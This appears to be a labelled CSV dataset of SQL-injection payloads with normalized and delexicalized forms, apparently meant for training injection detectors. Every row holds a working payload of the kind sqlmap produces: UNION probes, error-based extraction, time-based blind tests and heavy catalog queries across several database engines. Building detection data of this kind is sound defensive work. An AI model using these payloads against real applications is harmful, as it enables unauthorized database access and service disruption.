payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sqli_dataset.csv,,True,"-2872 ) where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM> ) where <NUM> = <NUM> or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #"
"-7255' union all select 2127,2127,2127,2127,2127#",1,sqli_dataset.csv,,False,"-7255' union all select 2127,2127,2127,2127,2127#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' ) where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>' ) where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1%""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1,sqli_dataset.csv,,True,"1'|| ( select 'jpow' from dual where 4381 = 4381 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",<NUM><STR>jpow<STR>
1  )   as tbve where 4828  =  4828,1,sqli_dataset.csv,,False,1 ) as tbve where 4828 = 4828,<NUM> ) as tbve where <NUM> = <NUM>
1'+  (  select iwbs where 4939  =  4939,1,sqli_dataset.csv,,True,1'+ ( select iwbs where 4939 = 4939,<NUM>'+ ( select iwbs where <NUM> = <NUM>
"1' in boolean mode  )   union all select null,null,null,null,null--",1,sqli_dataset.csv,,False,"1' in boolean mode ) union all select null,null,null,null,null--","<NUM>' in boolean mode ) union all select null,null,null,null,null--"
"-4385%'   )    )    union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1,sqli_dataset.csv,,False,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#","-<NUM>%' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,1,sqli_dataset.csv,,False,select ( case when ( 7271 = 1658 ) then 7271 else 7271* ( select 7271 from information_schema.character_sets ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) #
1'  )   as fksm where 9714  =  9714,1,sqli_dataset.csv,,False,1' ) as fksm where 9714 = 9714,<NUM>' ) as fksm where <NUM> = <NUM>
"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sqli_dataset.csv,,True,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --","<NUM> where <NUM> = <NUM> or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) --"
1  )   as drgs where 1989  =  1989 order by 1--,1,sqli_dataset.csv,,False,1 ) as drgs where 1989 = 1989 order by 1--,<NUM> ) as drgs where <NUM> = <NUM> order by <NUM>--
"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM>' and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1' ) ) as kwre where 7775 = 7775 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) ) as kwre where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'qhgp'  =  'qhgp",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'qhgp' = 'qhgp","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( <STR> = 'qhgp"
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",1,sqli_dataset.csv,,True,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",<NUM><STR>blnh<STR>blnh
-1499  )   as gxfm where 9762  =  9762 or 5989  =  4782--,1,sqli_dataset.csv,,False,-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,-<NUM> ) as gxfm where <NUM> = <NUM> or <NUM> = <NUM>--
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sqli_dataset.csv,,False,"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" ) ) and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',1,sqli_dataset.csv,,True,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5 ) ) +',<NUM><STR>toec<STR>
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sqli_dataset.csv,,False,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )","<NUM> or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )"
-4023 or   (  8779  =  5716  )  *5716,1,sqli_dataset.csv,,False,-4023 or ( 8779 = 5716 ) *5716,-<NUM> or ( <NUM> = <NUM> ) *<NUM>
1'||  (  select 'eyiy' from dual where 8127  =  8127,1,sqli_dataset.csv,,False,1'|| ( select 'eyiy' from dual where 8127 = 8127,<NUM><STR>eyiy' from dual where <NUM> = <NUM>
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( <STR> like 'vfxg"
"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1,sqli_dataset.csv,,False,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )","<NUM>', ( begin if ( <NUM> = <NUM> ) then dbms_lock.sleep ( <NUM> )"
"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1"" ) ) as daqd where 4390 = 4390 and elt ( 3114 = 3114,sleep ( 5 ) ) #","<NUM>"" ) ) as daqd where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
"-2009%' union all select 1991,1991#",1,sqli_dataset.csv,,False,"-2009%' union all select 1991,1991#","-<NUM>%' union all select <NUM>,<NUM>#"
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",1,sqli_dataset.csv,,False,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'fele' = 'fele",<NUM><STR>fele<STR>fele
"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1,sqli_dataset.csv,,False,"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",<NUM>%<STR>%<STR>
1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,sqli_dataset.csv,,False,1 ) where 2199 = 2199 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,<NUM> ) where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu ) --
"1' where 4417  =  4417 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --","<NUM>' where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1,sqli_dataset.csv,,False,"-1620 ) ) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--","-<NUM> ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sqli_dataset.csv,,True,"1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM><STR>opqr' where <NUM> = <NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1,sqli_dataset.csv,,False,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )","<NUM>"" and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) )"
"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) where 9206 = 9206 union all select null,null,null,null,null,null#","<NUM> ) where <NUM> = <NUM> union all select null,null,null,null,null,null#"
"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,True,"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM><STR>ycsv' where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) and 7533 = 7533 and ( ""%"" = """,<NUM>%<STR>%<STR>
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # lchh",1,sqli_dataset.csv,,False,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # lchh","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) # lchh"
"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sqli_dataset.csv,,False,"1'|| ( select 'uusj' where 2149 = 2149 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",<NUM><STR>uusj<STR>abcdefg<STR>
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1,sqli_dataset.csv,,True,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) # fmxq","<NUM> and extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) # fmxq"
"-1512 union all select 9013,9013,9013,9013#",1,sqli_dataset.csv,,False,"-1512 union all select 9013,9013,9013,9013#","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>#"
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,sqli_dataset.csv,,False,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) )"
"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' ) and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
1 waitfor delay '0:0:5'-- nnnp,1,sqli_dataset.csv,,False,1 waitfor delay '0:0:5'-- nnnp,<NUM> waitfor delay <STR>-- nnnp
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sqli_dataset.csv,,False,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )","<NUM>' or <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )"
1'   )    )    as yqek where 1957  =  1957,1,sqli_dataset.csv,,False,1' ) ) as yqek where 1957 = 1957,<NUM>' ) ) as yqek where <NUM> = <NUM>
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",1,sqli_dataset.csv,,True,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fjwv"" like ""fjwv",<NUM><STR>fjwv<STR>fjwv
1  )   as hggi where 6511  =  6511,1,sqli_dataset.csv,,False,1 ) as hggi where 6511 = 6511,<NUM> ) as hggi where <NUM> = <NUM>
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1,sqli_dataset.csv,,False,"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'gxpr' = 'gxpr",<NUM><STR>abcdefg<STR>gxpr<STR>gxpr
"-6662""   )    )    union all select 6755--",1,sqli_dataset.csv,,False,"-6662"" ) ) union all select 6755--","-<NUM>"" ) ) union all select <NUM>--"
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sqli_dataset.csv,,True,1'+ ( select 'hplm' where 4008 = 4008 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM><STR>hplm' where <NUM> = <NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) ) ) and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",1,sqli_dataset.csv,,False,"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( ""omjx"" like ""omjx",<NUM><STR>omjx<STR>omjx
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1,sqli_dataset.csv,,False,1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,<NUM><STR>oxdh' where <NUM> = <NUM> and sleep ( <NUM> ) #
select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"-5776%' union all select 3075,3075,3075,3075,3075--",1,sqli_dataset.csv,,False,"-5776%' union all select 3075,3075,3075,3075,3075--","-<NUM>%' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",1,sqli_dataset.csv,,False,"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#","<NUM>' ) ) as oldh where <NUM> = <NUM> union all select null,null,null#"
1 rlike sleep  (  5  )  #,1,sqli_dataset.csv,,False,1 rlike sleep ( 5 ) #,<NUM> rlike sleep ( <NUM> ) #
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1,sqli_dataset.csv,,True,1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427,<NUM> ) rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) and ( <NUM> = <NUM>
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",1,sqli_dataset.csv,,False,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""sckh"" = ""sckh",<NUM><STR>sckh<STR>sckh
"1""  )   where 1607  =  1607",1,sqli_dataset.csv,,False,"1"" ) where 1607 = 1607","<NUM>"" ) where <NUM> = <NUM>"
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,sqli_dataset.csv,,False,1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( '%' = ',<NUM>%<STR>%<STR>
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",1,sqli_dataset.csv,,False,"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc",-<NUM><STR>ddbc<STR>ddbc
"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sqli_dataset.csv,,True,"1 ) ) as rual where 4649 = 4649 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM> ) ) as rual where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --"
"1%""   )    )    union all select null--",1,sqli_dataset.csv,,False,"1%"" ) ) union all select null--","<NUM>%"" ) ) union all select null--"
